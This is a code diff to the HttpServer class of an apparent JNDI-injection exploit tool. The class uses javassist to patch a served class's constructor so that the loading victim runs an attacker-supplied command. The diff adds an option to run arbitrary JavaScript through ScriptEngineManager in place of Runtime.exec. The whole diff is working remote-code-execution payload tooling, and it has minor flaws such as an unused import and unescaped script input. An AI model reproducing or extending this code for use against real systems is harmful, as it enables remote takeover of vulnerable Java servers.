@@ -6,13 +6,16 @@ import javassist.ClassPool;
 import javassist.CtClass;
 import javassist.CtConstructor;
 import org.apache.commons.lang3.reflect.FieldUtils;
+import sun.font.Script;
 
+import javax.script.ScriptEngineManager;
 import java.io.ByteArrayOutputStream;
 import java.net.InetSocketAddress;
 import java.util.concurrent.Executors;
 import java.util.jar.JarOutputStream;
 import java.util.zip.ZipEntry;
 
+import static artsploit.Utilities.makeJavaScriptString;
 import static org.apache.commons.text.StringEscapeUtils.escapeJava;
 
 public class HttpServer implements HttpHandler {
@@ -43,8 +46,14 @@ public class HttpServer implements HttpHandler {
 		CtClass exploitClass = classPool.get(clazz.getName());
 
 		//patch its bytecode by adding a new command
+		String commandToExecute = "{ Runtime.getRuntime().exec(\"" +  escapeJava(command) + "\"); }";
+		if(Config.jsFile != "") {
+			String cmd = Config.jsFile;
+			commandToExecute = "{ ((javax.script.ScriptEngineManager)javax.script.ScriptEngineManager.class.newInstance()).getEngineByName(\"JavaScript\").eval(\"" + cmd + "\"); }";
+		}
+
 		CtConstructor m = exploitClass.getConstructors()[0];
-		m.insertBefore("{ Runtime.getRuntime().exec(\"" +  escapeJava(command) + "\"); }");
+		m.insertBefore(commandToExecute);
 		exploitClass.setName(newName);
 		exploitClass.detach();
 		return exploitClass.toBytecode();
